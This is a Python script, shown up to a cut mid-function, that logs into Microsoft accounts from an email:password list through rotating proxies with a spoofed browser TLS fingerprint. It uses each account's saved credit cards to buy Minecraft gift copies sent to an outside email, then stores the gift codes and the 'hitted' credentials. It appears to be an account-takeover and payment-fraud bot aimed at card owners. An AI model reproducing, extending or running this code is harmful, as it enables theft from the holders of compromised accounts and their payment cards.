import os
try:
    import requests
    import random
    import urllib.parse
    import string
    import re
    import tls_client
    import json
    import time
    import yaml

    from datetime import datetime
    from requests_toolbelt import MultipartEncoder
    from colorama import Fore, Style, init
    from threading import Lock
    from concurrent.futures import ThreadPoolExecutor
    from traceback import print_exc
except ModuleNotFoundError:
    os.system("pip install requests")
    os.system("pip install tls_client")
    os.system("pip install pyyaml")
    os.system("pip install requests_toolbelt")
    os.system("pip install colorama")
    os.system("cls")
    import requests
    import tls_client
    import yaml
    from requests_toolbelt import MultipartEncoder
    from colorama import Fore, Style, init

flights =['sc_allowvenmoforbuynow-universalwebstore', 'sc_appendconversiontype', 'sc_imagelazyload', 'sc_pidlerrorhandler-minecraftnet', 'sc_showvalidpis', 'sc_checkoutitemfontweight', 'sc_challengescenarioda', 'sc_itemsubpricetsenabled', 'sc_purchasedblockedby', 'sc_passthroughculture', 'sc_scdssapi', 'sc_checkoutplaceordermoraybuttons', 'sc_cartcoadobetelemetryfix', 'sc_redirecttosignin', 'sc_disablelistpichanges-storewindowsinapp', 'sc_errorscenariotelemetry', 'sc_buynowpmgrouping', 'sc_paymentpickeritem', 'sc_cleanreducercode', 'sc_dimealipaystylingfix', 'sc_asyncpurchasefailure', 'sc_disablecsvforadd-xeweb', 'sc_promocode', 'sc_buynowpmgrouping-clipchamp', 'sc_manualreviewcongrats', 'sc_optionalcatalogclienttype', 'sc_klarna', 'sc_preparecheckoutrefactor', 'sc_euomnibusprice', 'sc_gcoitemeligibility', 'sc_productimageoptimization', 'sc_reactredeemv2', 'sc_currencyformattingpkg', 'sc_fixasyncpiflow', 'sc_pidlnetworkerror', 'sc_allowvenmoforbuynow', 'sc_redeemupdateprofileredirect', 'sc_promocodefeature-web-desktop', 'sc_disabledpaymentoption', 'sc_enablecartcreationerrorparsing', 'sc_purchaseblock', 'sc_returnoospsatocart', 'sc_updatepopupstring', 'sc_allowpaysafeforus', 'sc_nextpidl', 'sc_fixasyncpitelemetry', 'sc_apperrorboundarytsenabled', 'sc_allowupiqr', 'sc_apgpinlineerror', 'sc_allowpaysafeforus-minecraftnet', 'sc_usenewinstructionstring', 'sc_fincastlecallerapplicationidcheck', 'sc_versionts', 'sc_allowpaypalbnpl', 'sc_officescds', 'sc_allowpaypalbnplforcheckout', 'sc_disableupgradetrycheckout', 'sc_extendPageTagToOverride', 'sc_mcupgrade', 'sc_perfscenariofix', 'sc_disablebuynowpmgrouping-officedime', 'sc_skipselectpi', 'sc_disablecsvforadd-minecraftnet', 'sc_allowmpesapi', 'sc_reloadiflineitemdiscrepancy', 'sc_fatalerroractionsts', 'sc_removereduxtoolkit', 'sc_allowvenmo', 'sc_spinnerts', 'sc_buynowpmgrouping-storeapp', 'sc_gifterroralert', 'sc_achpaymentoptiontsenabled', 'sc_shippingallowlist', 'sc_autorenewalconsentnarratorfix', 'sc_emptyresultcheck', 'sc_bulkupdateproducts', 'sc_buynowpagetsenabled', 'sc_buynowpmgrouping-xboxcom', 'sc_giftredeemlegalterms', 'sc_abandonedretry', 'sc_analyticsforbuynow', 'sc_removelodash', 'sc_isrighttoleftinpage', 'sc_asyncpurchasefailurexboxcom', 'sc_apploadingts', 'sc_prominenteddchange', 'sc_buynowpmgrouping-minecraftnet', 'sc_disableshippingaddressinit', 'sc_preparecheckoutperf', 'sc_buynowuiprod', 'sc_contentratingts', 'sc_allowvenmoforbuynow-xboxcom', 'sc_rspv2', 'sc_buynowlistpichanges', 'sc_disableupiforbuynow-officedime', 'sc_allowpaysafeforus-storeapp', 'sc_expiredcardnextbutton', 'sc_uuid', 'sc_checkoutasyncpurchase', 'sc_readytopurchasefix', 'sc_enablelegalrequirements', 'sc_pidlignoreesckey', 'sc_expanded.purchasespinner', 'sc_trycheckoutnobackup', 'sc_disablevenmoforbuynow-officedime', 'sc_hideredeemclient-minecraftnet', 'sc_buynowpmgrouping-universalwebstore', 'sc_giftingtelemetryfix', 'sc_alwayscartmuid', 'sc_checkoutloadspinner', 'sc_reactredeem-storewindowsinapp', 'sc_perfloadeventfix', 'sc_usekoreanlegaltermstring', 'sc_purchaseredirectcontinuets', 'sc_fincastleui', 'sc_updateprofiletsenabled', 'sc_flexsubs', 'sc_notfoundts', 'sc_useonedscookiemanager', 'sc_scenariotelemetryrefactor', 'sc_promocodefocus', 'sc_onbodytsenabled', 'sc_pidlerrorhandler-storeapp', 'sc_bankchallengecheckout', 'sc_allowupiqrforbuynow', 'sc_fixforonlyasyncpiselect', 'sc_railv2', 'sc_checkoutglobalpiadd', 'sc_reactcheckout', 'sc_minmaxcheck', 'sc_helpv2', 'sc_xboxcomnosapi', 'sc_updateredemptionlink', 'sc_reactredeem-universalwebstore', 'sc_clientdebuginfo', 'sc_productlegaltermsv1ts', 'sc_pidlerrorhandler-xeweb', 'sc_reactredeem-storeapp', 'sc_hidedisabledpis', 'sc_paymentoptionnotfound', 'sc_removeresellerforstoreapp', 'sc_hideshippingfee', 'sc_enablekakaopay', 'sc_checkoutcontactpreference', 'sc_ordercheckoutfix', 'sc_disablecsvforadd-xboxcom', 'sc_calldccforasyncpi', 'sc_promostepstatus', 'sc_buynowglobalpiadd', 'sc_overlayfix', 'sc_buynowpmgrouping-skypecom', 'sc_buynowuipreload', 'sc_bnplmsgcart', 'sc_updatebillinginfo', 'sc_buynowpmgrouping-cascadewebstore', 'sc_allowpaysafeforus-xboxcom', 'sc_buynowpmgrouping-surfaceapp', 'sc_readymessagemark', 'sc_allowupiforbuynow', 'sc_redeemerroralert', 'sc_xboxcomasyncpurchase', 'sc_disablebuynowpmgrouping-storewindowsinapp', 'sc_askaparentroutetsenabled', 'sc_errorcartinfotelemetry', 'sc_skypenonactiveerror', 'sc_skippurchaseconfirm', 'sc_buynowfocustrapkeydown', 'sc_shareddowngrade', 'sc_addasyncpitelemetry', 'sc_eligibilityapi', 'sc_paymentchallengetsenabled', 'sc_allowvenmoforbuynow-minecraftnet', 'sc_removesetpaymentmethod', 'sc_ordereditforincompletedata', 'sc_disablecsvforadd-xenative', 'sc_bankchallenge', 'sc_billingaddressbuttontsenabled', 'sc_allowelo', 'sc_asyncpiurlupdate', 'sc_upistringchanges', 'sc_delayretry', 'sc_pidlerrorhandler-xboxcom', 'sc_allowupi', 'sc_hidesubscriptionprice', 'sc_perfredeemcomplete', 'sc_loadtestheadersenabled', 'sc_conversionblockederror', 'sc_cleanuppromocodes', 'sc_mcrenewaldatev2', 'sc_allowpaysafecard', 'sc_telemetryforbillingemail', 'sc_pidlloading', 'sc_addfocuslocktosubscriptionmodal', 'sc_purchasedblocked', 'sc_outofstock', 'sc_buynowpagexboxts', 'sc_allowcustompifiltering', 'sc_purchaseblockerrorhandling', 'sc_perfsummary', 'sc_buynowcontactpref', 'sc_errorpageviewfix', 'sc_newcheckoutselectorforxboxcom', 'sc_splipidltresourcehelper', 'sc_xboxredirection', 'sc_setbehaviordefaultvalue', 'sc_clienttelemetryforceenabled', 'sc_allowpaysafeforus-universalwebstore', 'sc_updateratingdescription', 'sc_paymentoptionlistts', 'sc_formatjsxts', 'sc_lowbardiscountmap', 'sc_moraystyle', 'sc_contactpreferenceupdate', 'sc_paymentsessiontsenabled', 'sc_hipercard', 'sc_uppercasepromocode', 'sc_resellerdetail', 'sc_askaparentinsufficientbalance', 'sc_fincastlecalculation', 'sc_moderngamertaggifting', 'sc_allowvenmoforcheckout', 'sc_xdlshipbuffer', 'sc_allowverve', 'sc_inlinetempfix', 'sc_purchaseredirectwaitts', 'sc_upgrademodaltrycheckout', 'sc_devicerepairpifilter', 'sc_statusts', 'sc_disablecsvforadd-xboxsocial', 'sc_greenshipping', 'sc_blocklegacyupgrade', 'sc_minecraftctasupdate', 'sc_disablecsvforadd']
lock = Lock()
config = yaml.safe_load(open('config.yml','r'))['data']

class Logger:
    @staticmethod
    def Sprint(tag: str, content: str, color):
        ts = f"{Fore.RESET}{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}"
        with lock:
            print(Style.BRIGHT + ts + color + f" [{tag}] " + Fore.RESET + content + Fore.RESET)
    
    @staticmethod
    def Ask(tag: str, content: str, color):
        ts = f"{Fore.RESET}{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}"
        return input(Style.BRIGHT + ts + color + f" [{tag}] " + Fore.RESET + content + Fore.RESET)

class Purchase:
    def __init__(self,ms_creds:str) -> None:
        self.ms_creds = ms_creds
        self.email = ms_creds.split(':')[0]
        self.password = ms_creds.split(':')[1]
        self.auth_session = requests.Session()
        roxy = open("proxies.txt").read().splitlines()
        if not roxy== []:
            roxy = random.choice(roxy)
            proxies = {
                "https" : f"http://{roxy}"
            }
            self.proxy = proxies['https']
        else:
            proxies = None
            self.proxy = None
        self.auth_session.proxies = proxies
        self.purchase_session = tls_client.Session(
            client_identifier="chrome112"
        )   
        self.purchase_session.proxies = proxies
        self.purchase_session.headers['Accept-Encoding'] = "deflate"

        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        self.productId = config['productId']
        self.skuId =config['skuId']
        self.receiveMail = config['receiveMail']

        self._run()
    @staticmethod
    def generateHexStr(len: int):
        return ''.join(random.choices('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=len))
    @staticmethod
    def remove_content(filename: str, delete_line: str) -> None:
        with open(filename, "r+") as io:
            content = io.readlines()
            io.seek(0)
            for line in content:
                if not (delete_line in line):
                    io.write(line)
            io.truncate()

    def auth_get_request(self,*args,**kwargs):
        while True:
            try:
                r = self.auth_session.get(*args,**kwargs)
                return r
            except:
                continue

    def auth_post_request(self,*args,**kwargs):
        while True:
            try:
                r = self.auth_session.post(*args,**kwargs)
                return r
            except:
                continue
    
    def purchase_get_request(self,*args,**kwargs):
        while True:
            try:
                r = self.purchase_session.get(*args,**kwargs,proxy=self.proxy)
                return r
            except:
                continue

    def purchase_post_request(self,*args,**kwargs):
        while True:
            try:
                r = self.purchase_session.post(*args,**kwargs,proxy=self.proxy)
                return r
            except:
                continue

    def purchase_put_request(self,*args,**kwargs):
        while True:
            try:
                return self.purchase_session.put(*args,**kwargs,proxy=self.proxy)
            except:
                continue

    def doPrivacyNotice(self):
        privNotifUrl = self.loginResp.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
        corelationId = self.loginResp.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
        mCode = self.loginResp.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]

        priveNotifPage = self.auth_post_request(privNotifUrl,data={'correlation_id':corelationId,'code':mCode}).text

        privNotifPostData={'AppName': 'ALC',
'ClientId': priveNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
'ConsentSurface': 'SISU',
'ConsentType': 'ucsisunotice',
'correlation_id': corelationId,
'CountryRegion': priveNotifPage.split("ucis.CountryRegion = '")[1].split("'")[0],
'DeviceId':'' ,
'EncryptedRequestPayload': priveNotifPage.split("ucis.EncryptedRequestPayload = '")[1].split("'")[0],
'FormFactor': 'Desktop',
'InitVector':priveNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
'Market': priveNotifPage.split("ucis.Market = '")[1].split("'")[0],
'ModelType': 'ucsisunotice',
'ModelVersion': '1.11',
'NoticeId': priveNotifPage.split("ucis.NoticeId = '")[1].split("'")[0],
'Platform': 'Web',
'UserId': priveNotifPage.split("ucis.UserId = '")[1].split("'")[0],
'UserVersion': '1'}
        privNotifPostData_m = MultipartEncoder(fields=privNotifPostData,boundary='----WebKitFormBoundary'+''.join(random.sample(string.ascii_letters + string.digits, 16)))

        self.auth_post_request('https://privacynotice.account.microsoft.com/recordnotice', headers={
    'authority': 'privacynotice.account.microsoft.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.7',
    'content-type': privNotifPostData_m.content_type,
    'origin': 'https://privacynotice.account.microsoft.com',
    'referer': privNotifUrl,
    'sec-gpc': '1',
    'user-agent': self.user_agent,
}, data=privNotifPostData_m)
    
        self.auth_session.headers['Referer'] = "https://privacynotice.account.microsoft.com/"
        returnUrl = urllib.parse.unquote(privNotifUrl.split('notice?ru=')[1])
        self.loginResp = self.auth_get_request(returnUrl)
    
    def fetchAuth(self):
    
        self.auth_session.headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'identity',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': self.user_agent,
}
        
        getLoginPage = self.auth_session.get('https://login.live.com/ppsecure/post.srf').text

        if not ",urlPost:'" in getLoginPage:
            Logger.Sprint('ERROR','Failed To Get Login Page Data!',Fore.LIGHTRED_EX)
            return "fail"

        self.flowToken1 = getLoginPage.split(''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
        self.loginPostUrl = getLoginPage.split(",urlPost:'")[1].split("'")[0]
        self.credentialsUrl = getLoginPage.split("Cd:'")[1].split("'")[0]
        self.uaid = self.auth_session.cookies.get_dict()['uaid']

        loginPostData = {'CookieDisclosure': '0',
 'IsFidoSupported': '1',
 'LoginOptions': '3',
 'NewUser': '1',
 'PPFT':self.flowToken1,
 'PPSX': 'Passpo',
 'fspost': '0',
 'i13': '0',
 'i19': '53451',
 'i21': '0',
 'isRecoveryAttemptPost': '0',
 'isSignupPost': '0',
 'login': self.email,
 'loginfmt':    self.email,
 'passwd': self.password,
 'ps': '2',
 'type': '11'}
        self.auth_session.headers['Origin'] = "https://login.live.com"
        self.auth_session.headers['Referer'] = "https://login.live.com/"
        loginHeaders ={
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

        self.loginResp = self.auth_session.post(self.loginPostUrl,data=loginPostData,headers=loginHeaders)
        if "https://account.live.com/recover" in self.loginResp.text:
            Logger.Sprint('ERROR','2fa On Microsoft Account!',Fore.LIGHTRED_EX)
            return "fail"
        if "https://privacynotice.account.microsoft.com/notice" in self.loginResp.text:
            self.doPrivacyNotice()
        if not "sFT:" in self.loginResp.text:
            Logger.Sprint('ERROR','Invalid Microsoft Account!',Fore.LIGHTRED_EX)
            return "fail"

        self.flowToken2 = re.findall("sFT:'(.+?(?=\'))", self.loginResp.text)[0]
        self.loginPostUrl2 =  re.findall("urlPost:'(.+?(?=\'))", self.loginResp.text)[0]

        loginPostData2 = {
    "LoginOptions": "3",
    "type": "28",
    "ctx": "",
    "hpgrequestid": "",
    "PPFT": self.flowToken2,
    "i19": str(random.randint(10000,30000))
}
        self.auth_session.headers['Referer'] = self.loginPostUrl
        self.auth_session.headers['Origin'] = "https://login.live.com"
        midAuth2 = self.auth_post_request(self.loginPostUrl2,data=loginPostData2).text

        while "fmHF" in midAuth2:
            midAuth2 = {
    "fmHF": midAuth2.split('name="fmHF" id="fmHF" action="')[1].split('"')[0],
    "pprid": midAuth2.split('type="hidden" name="pprid" id="pprid" value="')[1].split('"')[0],
    "nap": midAuth2.split('type="hidden" name="NAP" id="NAP" value="')[1].split('"')[0],
    "anon": midAuth2.split('type="hidden" name="ANON" id="ANON" value="')[1].split('"')[0],
    "t": midAuth2.split('<input type="hidden" name="t" id="t" value="')[1].split('"')[0]} 
            data = {
        'pprid': midAuth2["fmHF"],
        'NAP': midAuth2['nap'],
        'ANON': midAuth2['anon'],
        't': midAuth2['t'],
    }
            midAuth2Url = midAuth2['fmHF']
            self.auth_session.headers['Referer'] = "https://login.live.com/"
            midAuth2 = self.auth_post_request(midAuth2Url,data=data).text   

        accountXbox = self.auth_get_request('https://account.xbox.com/',headers={
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': self.user_agent,
}).text
        if "fmHF" in accountXbox:
            xbox_json = {
"fmHF": accountXbox.split('id="fmHF" action="')[1].split('"')[0],
"pprid": accountXbox.split('id="pprid" value="')[1].split('"')[0],
"nap": accountXbox.split('id="NAP" value="')[1].split('"')[0],
"anon": accountXbox.split('id="ANON" value="')[1].split('"')[0],
"t": accountXbox.split('id="t" value="')[1].split('"')[0]}
            
            verifyToken = self.auth_post_request(xbox_json['fmHF'],timeout=20, headers={
        'Content-Type': 'application/x-www-form-urlencoded',
    },data={
        "pprid": xbox_json['pprid'],
        "NAP": xbox_json['nap'],
        "ANON": xbox_json['anon'],
        "t": xbox_json['t']
    }).text.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
            self.auth_post_request("https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount", headers={
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://account.xbox.com',
    'Referer': xbox_json['fmHF'],
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': self.user_agent,
    'X-Requested-With': 'XMLHttpRequest',
    '__RequestVerificationToken': verifyToken,
},data={
        "partnerOptInChoice": "false",
        "msftOptInChoice": "false",
        "isChild": "true",
        "returnUrl": "https://www.xbox.com/en-US/?lc=1033"
    })
        getXbl = self.auth_get_request(f'https://account.xbox.com/en-us/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/').text
        try:
            rel = getXbl.split('"http://mp.microsoft.com/":{')[1].split('},')[0]
            json_obj = json.loads("{"+rel+"}")
            xbl_auth = "XBL3.0 x=" + json_obj['userHash'] + ";" + json_obj['token']
            return xbl_auth
        except:
            Logger.Sprint('ERROR',"Failed to get XBL Authorization!",Fore.LIGHTRED_EX)
            return "fail"
    def getCartsHeader(self):
        return {
    'authority': 'cart.production.store-web.dynamics.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': self.xbl3,
    'content-type': 'application/json',
    'ms-cv':f"{self.generateHexStr(22)}.0.4",
    'origin': 'https://www.microsoft.com',
    'referer': 'https://www.microsoft.com/',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': self.user_agent,
    'x-authorization-muid': self.muid,
    'x-ms-correlation-id': self.corId,
    'x-ms-tracking-id': self.trackId,
    'x-ms-vector-id':self.vectorId,
}
    def pm_mp_headers(self):
        return {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Origin': 'https://www.microsoft.com',
    'Referer': 'https://www.microsoft.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': self.user_agent,
    'authorization': self.xbl3,
    'content-type': 'application/json',
    'correlation-context': f'v=1,ms.b.tel.scenario=commerce.payments.PaymentSessioncreatePaymentSession.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId={self.generateHexStr(22)}',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-ms-flight': 'EnableThreeDSOne',
    'x-ms-pidlsdk-version': '1.22.0_reactview',
}
        
    def getAvailibilityId(self):
        return self.purchase_get_request(f"https://displaycatalog.mp.microsoft.com/v7/products/{self.productId}?languages=Nuetral&market={self.market}").json()['Product']['DisplaySkuAvailabilities'][0]['Availabilities'][0]['AvailabilityId']

    def getPaymentMethods(self):
        getPMMethods = requests.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US&partner=webblends',headers={"authorization":self.xbl3}).json()

        instruments = []
        for pm in getPMMethods:
            if pm["paymentMethod"]["paymentMethodFamily"]=="credit_card" and pm['status']=="Active":
                instruments.append({
                "id":pm['id'],
                "market" : pm['details']['address']['country']
            })
        return [i for n, i in enumerate(instruments) if i not in instruments[:n]]

    def fetchGiftCode(self,cartId:str):
        verifyToken = self.auth_get_request(f"https://account.microsoft.com/billing/orders/details?orderId={cartId}&fref=home.drawers.order-history.order-details",headers={
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'https://account.microsoft.com/',
    'User-Agent':self.user_agent,
} ).text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
        orderResp = self.auth_get_request(f"https://account.microsoft.com/billing/orders/get?orderId={cartId}&isInD365Orders=true&isPiDetailsRequired=true&timeZoneOffsetMinutes=-330",headers={
    'Referer': f'https://account.microsoft.com/billing/orders/details?orderId={cartId}&fref=home.drawers.order-history.order-details',
    'User-Agent':self.user_agent,
    'X-Requested-With': 'XMLHttpRequest',
    '__RequestVerificationToken': verifyToken,
}).json()
        giftCode = orderResp['items'][0]['giftCode']
        region = orderResp['market']

        with lock:
            open("gift_codes.txt","a").write(f"{giftCode}|{region}\n")
            
    def purchase(self,pi_id:str,market:str):
        self.market = market.lower()
        self.locale = f"en-{market}"
        self.paymentInstrumentId = pi_id
        AvailibilityId = self.getAvailibilityId()
        self.headers = {
    'authority': 'www.microsoft.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.minecraft.net',
    'referer': 'https://www.minecraft.net/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': self.user_agent,
}
        buyNowData = {
    'data': json.dumps({"products":[{"productId":self.productId,"skuId":self.skuId,"availabilityId":AvailibilityId,"market":self.market,"locale":self.locale,"mscv":"N7nqsQzlrn5M4sop6e3BW8.0","giftProduct":"true"}],"flights":["sc_minecraftctasupdate"],"clientType":"MinecraftNet","data":{"usePurchaseSdk":True},"layout":"Inline","cssOverride":"MinecraftNet","scenario":"gift"}),
    'auth': json.dumps({"XToken":self.xbl3}),
}
        buyNow = self.purchase_post_request(f'https://www.microsoft.com/store/buynow?&noCanonical=true&market={self.market}&locale={self.locale}',data=buyNowData,headers=self.headers)

        if not buyNow.status_code < 400:
            Logger.Sprint('ERROR','Failed To Start Minecraft Order!',Fore.LIGHTRED_EX)
            return "fail"
        if not ',"soldToAddressId":"' in buyNow.text:
            Logger.Sprint("ERROR","No Billing Address Found! Cry about it",Fore.LIGHTRED_EX)
            return "fail"
        self.currencyCode = buyNow.text.split('"currencyCode":"')[1].split('"')[0]
        self.paymentInstrumentId = buyNow.text.split('{"paymentInstrumentId":"')[1].split('"')[0]
        self.cartId = buyNow.text.split('"cartId":"')[1].split('"')[0]
        self.muid = buyNow.text.split('"alternativeMuid":"')[1].split('"')[0]
        self.vectorId = buyNow.text.split('"vectorId":"')[1].split('"')[0]
        self.corId = buyNow.text.split('"correlationId":"')[1].split('"')[0]
        self.trackId = buyNow.text.split('"trackingId":"')[1].split('"')[0]
        self.accId = buyNow.text.split(',"accountId":"')[1].split('"')[0]
        self.soldToAddressId = buyNow.text.split(',"soldToAddressId":"')[1].split('"')[0]
        self.sessionId = buyNow.text.split('"sessionId":"')[1].split('"')[0]

        updateCartData = {
    'locale': self.locale,
    'market': self.market,
    'catalogClientType': '',
    'clientContext': {
        'client': 'MinecraftNet',
        'deviceFamily': 'Web',
    },
    'flights': flights,
    'paymentInstrumentId': self.paymentInstrumentId,
    'csvTopOffPaymentInstrumentId': None,
    'billingAddressId': {
        'accountId': self.accId,
        'id': self.soldToAddressId,
    },
    'sessionId': self.sessionId,
    'orderState': 'CheckingOut',
}
        updateCart = self.purchase_put_request(f"https://cart.production.store-web.dynamics.com/cart/v1.0/cart/updateCart?cartId={self.cartId}&appId=BuyNow",json=updateCartData,headers=self.getCartsHeader())
        self.lineItemId = updateCart.json()["cart"]['lineItems'][0]['id']
        self.amount = updateCart.json()["cart"]['lineItems'][0]['totalAmount']

        updatelineItmesData = {
    'clientContext': {
        'client': 'MinecraftNet',
        'deviceFamily': 'Web',
    },
    'flights':flights,
    'items': [
        {
            'id': self.lineItemId,
            'giftee': {
                'gifteeEmail': self.receiveMail,
                'gifteeSenderName': 'NOTLIT PURCHASER',
                'gifteeType': 'email',
                'gifteeGamertag': '',
            },
        },
    ],
    'market': self.market,
    'locale':self.locale,
    'catalogClientType': '',
    'isGift': True,
}
        self.purchase_put_request(f"https://cart.production.store-web.dynamics.com/cart/v1.0/cart/bulkUpdateLineItems?cartId={self.cartId}&appId=BuyNow&tryCheckout=true&price=true",json=updatelineItmesData,headers=self.getCartsHeader())
        
        descriptionsParams = {
    'paymentSessionData': json.dumps({'amount': self.amount,
 'challengeScenario': 'PaymentTransaction',
 'challengeWindowSize': '04',
 'country': self.market,
 'currency': self.currencyCode,
 'hasPreOrder': 'false',
 'language': self.locale,
 'partner': 'webblends',
 'piCid': self.accId,
 'piid': self.paymentInstrumentId,
 'purchaseOrderId': self.cartId}),
    'operation': 'Add',
}
        descrptions = self.purchase_get_request(f"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/PaymentSessionDescriptions",params=descriptionsParams,headers=self.pm_mp_headers())
        if not descrptions.status_code < 400:
            Logger.Sprint('ERROR','Failed to get 3DS Challenge Id!',Fore.LIGHTYELLOW_EX)
            return "fail"

        self.threedsId = descrptions.json()[0]["clientAction"]["context"]["id"]

#         challengeDesceptionsParams = {
#     'timezoneOffset': '-330',
#     'paymentSessionOrData': json.dumps(
#         {'amount': self.amount,
#  'challengeScenario': 'PaymentTransaction',
#  'challengeStatus': 'Unknown',
#  'challengeType': 'ValidatePIOnAttachChallenge',
#  'challengeWindowSize': '04',
#  'country':self.market, 
#  'currency': self.currencyCode,
#  'cv': 'N7nqsQzlrn5M4sop6e3BW8.0.4',
#  'hasPreOrder': False,
#  'id': self.threedsId,
#  'isChallengeRequired': True,
#  'isLegacy': False,
#  'isMOTO': False,
#  'language': self.locale,
#  'partner': 'webblends',
#  'piCid': self.accId,
#  'piid': self.paymentInstrumentId,
#  'purchaseOrderId': self.cartId,
#  'redeemRewards': False,
#  'rewardsPoints': 0,
#  'signature': f'placeholder_for_paymentsession_signature_{self.threedsId}'}
#     ),
#     'operation': 'RenderPidlPage',
# }
        # self.purchase_get_request(f"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/challengeDescriptions",params=challengeDesceptionsParams,headers=self.pm_mp_headers())
 
        purchaseData = {
    'cartId': self.cartId,
    'market': self.market,
    'locale': self.locale,
    'catalogClientType': '',
    'callerApplicationId': '_CONVERGED_',
    'clientContext': {
        'client': 'MinecraftNet',
        'deviceFamily': 'Web',
    },
    'paymentSessionId': self.sessionId,
    'riskChallengeData': {
        'type': 'threeds2',
        'data': self.threedsId,
    },
    'rdsAsyncPaymentStatusCheck': False,
    'paymentInstrumentId': self.paymentInstrumentId,
    'paymentInstrumentType': 'mc',
    'email': self.email,
    'csvTopOffPaymentInstrumentId': None,
    'billingAddressId': {
        'accountId': self.accId,
        'id': self.soldToAddressId,
    },
    'currentOrderState': 'CheckingOut',
    'flights': flights,
    'itemsToAdd': {},
}
        purchaseResponse = self.purchase_post_request("https://cart.production.store-web.dynamics.com/cart/v1.0/Cart/purchase?appId=BuyNow",json=purchaseData,headers=self.getCartsHeader()).json()

        cart = purchaseResponse.get("cart")
        if cart:
            if not cart.get('readyToPurchase'):
                Logger.Sprint('SUCCESS',f'Hitted! ProductId : {self.productId} SkuId: {self.skuId} -> {self.email}',Fore.LIGHTGREEN_EX)
                with lock:
                    if not self.ms_creds in open('purchased.txt').read():
                        open('purchased.txt','a').write(f"{self.ms_creds}\n")
                self.fetchGiftCode(cart.get('id'))
            else:
